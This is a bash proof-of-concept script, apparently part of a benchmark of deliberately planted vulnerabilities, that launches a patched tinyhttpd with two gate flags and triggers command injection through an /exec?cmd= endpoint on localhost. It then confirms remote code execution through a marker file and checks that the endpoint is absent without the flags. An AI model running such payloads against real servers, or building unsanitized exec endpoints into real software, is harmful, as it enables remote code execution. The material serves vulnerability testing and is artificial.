#!/usr/bin/env bash
# PoC for 010_tinyhttpd_C2I1S1
# Axes: C2 (struct config gate, two CLI flags) / I1 (direct to sink) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (httpd) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/httpd"
WWWROOT="/tmp/poc_010_www"
MARKER="/tmp/poc_010_marker"
PORT=18010

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT/htdocs"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting httpd with --exec-mode --exec-logging on port $PORT..."
# S1: no sanitization to bypass
(cd "$WWWROOT" && "$BINARY" --port "$PORT" --exec-mode --exec-logging) &
SERVER_PID=$!
sleep 1

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>/tmp/poc_010_marker"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>/tmp/poc_010_marker" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without gate flags ───────────────────────
echo "[*] verifying gate: endpoint must be absent without gate flags (omitting both --exec-mode and --exec-logging)..."
(cd "$WWWROOT" && "$BINARY" --port 19010 ) &
SAFE_PID=$!
sleep 1
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:19010/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without gate flags"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
